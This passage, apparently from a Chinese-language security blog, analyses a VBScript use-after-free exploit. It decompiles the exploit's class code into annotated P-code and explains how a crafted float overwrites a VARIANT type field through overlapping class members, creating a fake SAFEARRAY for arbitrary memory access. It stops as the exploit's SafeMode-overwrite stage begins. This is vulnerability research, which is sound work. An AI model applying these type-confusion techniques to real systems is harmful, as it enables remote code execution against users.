
总的来说，上述实现任意地址读取的重点在于最后使用`myclass1`占位空间时，`vbs`引擎并未清理掉之前`myclass2`的成员变量`mem`，而该变量地址刚好与`myclass1.mem`相差`0xC`（为什么？？？），以至于后续可以实现类型混淆构造出任意地址访问的数组结构。所以接下来我们重点讨论类对象成员变量的空间布局。

## 0x04 从P-code解析过程看类对象成员变量的内存空间布局

`vbs`引擎执行脚本的大致流程是先将脚本内容解析成相应的`opcode`字节码（该字节码可以解析成`P-code`（类似于二进制PE文件的反汇编）便于调试人员静态分析其执行流程），然后虚拟机中的`CScriptRuntime`类将会接管这些字节码并基于特定的堆栈规则开始解释执行。通过研究相应的`P-code`代码，可以让我们更直观地去理解`vbs`虚拟机的一些机制。

借用`Boris Larin`帖子中的`python`脚本（`kl_vbs_disasm_windbg.py`），在`vbscript!CScriptRuntime::RunNoEH`函数执行时，加载执行该脚本即可还原出`Vbs`脚本在解释执行时编译成的中间代码并将其反编译成伪代码（`P-code`）。注意安装配置`pykd`环境。笔者当前调试环境需要修改原脚本信息，将脚本中的`ecx`改为`edi`，如下所示（`IDA`回溯一层即可发现当前环境是用`edi`寄存器传递一个`struct var*`的变量结构指针）。

![](upload/attach/201903/808521_DNTXDYAW3UPHZWB.jpg)

反汇编后的`pcode`代码如下所示。

![](upload/attach/201903/808521_PH5FW3URFQAZWT2.png)

当前分析的重点是理解类对象成员的内存布局。我们主要分析两个过程：常规类的初始化过程和类默认属性过程`property get`。

分析`Class2`解析过程如下。

```
Function 6 ('Class2') [max stack = 1]://class2的构造函数，注意构造函数中类成员变量的初始化顺序，依次是构造函数->类其他成员函数->类成员变量
arg count = 0
lcl count = 0
Pcode:
019BC6E8 - 0000 OP_CreateClass 'Class2' //构造函数
019BC6ED - 0005 OP_FnBindEx 'p' 7 FALSE //成员函数p，FALSE表示functin bind的结果，绑定失败VBS虚拟机会调用VbscriptClass::CreateVar创建相应成员变量
019BC6F7 - 000F OP_FnBindEx 'setprop' 8 FALSE //成员函数setprop
019BC701 - 0019 OP_CreateVar 'mem' FALSE //成员变量mem
019BC707 - 001F OP_LocalSet 0 //设置返回地址进行退栈操作
019BC70A - 0022 OP_FnReturn //函数返回
Function 7 ('p') [max stack = 0]:
arg count = 0 //函数p参数数量
lcl count = 0 //函数p局部变量数量
Pcode:
***BOS(642,654)*** end function ****
019BC73C - 0000 OP_Bos1 0 //描述当前函数代码块的索引
019BC73E - 0002 OP_FnReturn //push返回地址
019BC73F - 0003 OP_Bos0 //pop返回地址，用于返回
019BC740 - 0004 OP_FuncEnd //函数返回结束
Function 8 ('setprop') [max stack = 1]:
arg count = 1 //参数数量为1
arg -1 = ref Variant 'value' //形参value位于arg-1位置，即返回地址之上，类似于intel32汇编中的先压入返回地址然后压入参数
lcl count = 0 //无局部变量
Pcode:
***BOS(684,695)*** mem = value ****
019BC77C - 0000 OP_Bos1 0
019BC77E - 0002 OP_LocalAdr -1 //pop出arg-1数据value
019BC781 - 0005 OP_NamedSt 'mem' //将上一步pop出的value保存在mem中
***BOS(699,710)*** setprop = 0 ****
019BC786 - 000A OP_Bos1 1
019BC788 - 000C OP_IntConst 0 //压入常整数0
019BC78A - 000E OP_LocalSt 0 //将0保存到arg位置，即设置函数setprop为0
***BOS(713,725)*** end function ****
019BC78D - 0011 OP_Bos1 2 //函数返回
019BC78F - 0013 OP_FnReturn
019BC790 - 0014 OP_Bos0
019BC791 - 0015 OP_FuncEnd
```

`confusion`类的解析过程。

```
Function 12 ('confusion') [max stack = 1]:
arg count = 0
lcl count = 0
Pcode:
019BC888 - 0000 OP_CreateClass 'confusion' //构造函数
019BC88D - 0005 OP_FnBindEx 'p' 13 TRUE //成员函数p，其默认属性获取函数已成功绑定
019BC897 - 000F OP_LocalSet 0
019BC89A - 0012 OP_FnReturn
Function 13 ('p') [max stack = 3]: //统计该类中最大堆栈层数为3，类似于函数嵌套层数
arg count = 0
lcl count = 1
lcl 1 = Variant 'myclass1' //一个局部变量myclass1。（不知道为什么这样分类，且遵循其规则就行）
tmp count = 4 //4个临时“变量”：循坏计数变量i，始末索引0、6，步数1.
Pcode:
***BOS(299,311)*** for i=0 to 6 ****
019BC8D4 - 0000 OP_Bos1 0
019BC8D6 - 0002 OP_IntConst 0
019BC8D8 - 0004 OP_IntConst 6
019BC8DA - 0006 OP_IntConst 1
019BC8DC - 0008 OP_ForInitNamed 'i' 5 4 //循环所需变量初始化
019BC8E5 - 0011 OP_JccFalse 0036 //循环终止跳转（跳转到019BC90A - 0036，注意跳转偏移是以当前pcode代码块为基址计算的）
***BOS(315,329)*** array_b(i) = 0 ****
019BC8EA - 0016 OP_Bos1 1
019BC8EC - 0018 OP_IntConst 0 //常整数0
019BC8EE - 001A OP_NamedAdr 'i' //取出索引i的pos值
019BC8F3 - 001F OP_CallNmdSt 'array_b' 1 //将0赋给array_b(i)
***BOS(332,336)*** next ****
019BC8FA - 0026 OP_Bos1 2
019BC8FC - 0028 OP_ForNextNamed 'i' 5 4
019BC905 - 0031 OP_JccTrue 0016
***BOS(339,364)*** set myclass1 = new Class1 ****
019BC90A - 0036 OP_Bos1 3
019BC90C - 0038 OP_InitClass 'Class1'
019BC911 - 003D OP_LocalSet 1
***BOS(367,395)*** myclass1.mem = FAKESAFEARRAY ****
019BC914 - 0040 OP_Bos1 4
019BC916 - 0042 OP_NamedAdr 'FAKESAFEARRAY' //先取出FAKESAFEARRAY全局变量的值
019BC91B - 0047 OP_LocalAdr 1 //找到栈中位置lcl 1的变量myclass1
019BC91E - 004A OP_MemSt 'mem' //memstore，将FAKESAFEARRAY保存到myclass1结构中的mem成员
***BOS(398,410)*** for i=0 to 6 **** //类似上面的赋值循环
019BC923 - 004F OP_Bos1 5
019BC925 - 0051 OP_IntConst 0
019BC927 - 0053 OP_IntConst 6
019BC929 - 0055 OP_IntConst 1
019BC92B - 0057 OP_ForInitNamed 'i' 3 2
019BC934 - 0060 OP_JccFalse 0086
***BOS(414,439)*** set array_b(i) = myclass1 ****
019BC939 - 0065 OP_Bos1 6
019BC93B - 0067 OP_LocalAdr 1
019BC93E - 006A OP_NamedAdr 'i'
019BC943 - 006F OP_CallNmdSet 'array_b' 1
***BOS(442,446)*** next ****
019BC94A - 0076 OP_Bos1 7
019BC94C - 0078 OP_ForNextNamed 'i' 3 2
019BC955 - 0081 OP_JccTrue 0065
***BOS(449,473)*** p = 174088534690791e-324 ****
019BC95A - 0086 OP_Bos1 8
019BC95C - 0088 OP_FltConst 35235911696384//取出浮点数35235911696384
019BC965 - 0091 OP_LocalSt 0 //将上面浮点数保存到栈中0位置，即返回该浮点数
***BOS(476,488)*** end property ****
019BC968 - 0094 OP_Bos1 9
019BC96A - 0096 OP_FnReturn
019BC96B - 0097 OP_Bos0
019BC96C - 0098 OP_FuncEnd
```

上述静态分析`pcode`的目的主要有两点：

1、理解类结构解析过程中各成员的初始化顺序。

2、`VBS`中特有的默认属性构造函数`default property get function`的执行逻辑。

现在我们回到前面提到的一个非常重要的结构。

![](upload/attach/201903/808521_Q3QZTJNVB65PRBC.png)

按照上述结构可以根据类对象`0x30`的结构解析出对象中各成员（成员函数和成员变量）的具体位置。动态验证过程中不难发现在实际成员初始化的过程中，各成员会以`VARIANT`的形式按照既定的初始化顺序存储在一段连续的内存空间中。

![](upload/attach/201903/808521_89F6FXGR5WZPJU2.png)

总结类成员在内存分配方法如下图所示。根据所有成员按需且遵循前面提到的初始化顺序申请一块连续的内存空间，各成员`VVAL1`，`VVAL2`，`VVAL3`...均以一个`0x10`的`VARIANT`结构呈现，相邻成员变量之间偏移等于一个固定的内存空间`0x32`+前一个成员名称（`UNICODE`字符串）的长度。

![](upload/attach/201903/808521_FBN7N8MAG9BACFQ.png)

结合上述的调试笔记来看：

1、初始占位内存的地址为`0x0235f4bc`、即类对象第一个初始化的成员变量的`VARIANT`结构地址。

2、用`myclass2`占位时，`myclass2.mem`的`VARIANT`地址= `0x0235f4bc` + `0x32` +len(`"p"`) +`0x32` + len(`"setprop"`) = `0x0235f530`。

其`VARIANT`结构：`00000008 00000000 002aa5e4 00000000`。

3、用`myclass1`占位前，`myclass1.mem`的`VARIANT`地址= `0x0235f4bc` + `0x32` +len(`"p0123456789"`) +`0x32` + len(`"p01"`) = `0x0235f53c`。

其`VARIANT`结构：`00000008 00000000 002aa5e4 00000000`。

4、调用`myclass2.setprop(myconf)`，`myconf`类的`default property get p`将浮点数`174088534690791e-324`（内存结构为：`00000005 000005dd 00000000 0000200c`）赋给`myclass2.mem`。由于`myclass1.mem`与`myclass2.mem`的`VARIANT`结构偏移`0xc`，将会覆盖上一步中的“`0008`”为“`200c`”，如下图所示。

![](upload/attach/201903/808521_ASDMNDSPJA2HS5D.png)

此处的类型混淆正是该漏洞利用的关键，对于此类类对象占位利用的`UAF`漏洞，类成员变量及成员变量名称都是可以灵活控制的，理解这里的混淆原理之后，我们即可准备着手去实现针对`VBS`中`UAF`漏洞利用的通用构造方法。

## 0x05 EXP构造

上述分析中我们已经可以在内存空间构造一个任意读写的数组空间`byte szBuff[80000000]`，类似于`CVE-2014-6332`中提到的、借助 `Lenb`函数获取指定的对象地址。在此基础上，有两种`Exploit`构造方法。

### A、覆盖SafeMode标志位开启上帝模式执行任意代码
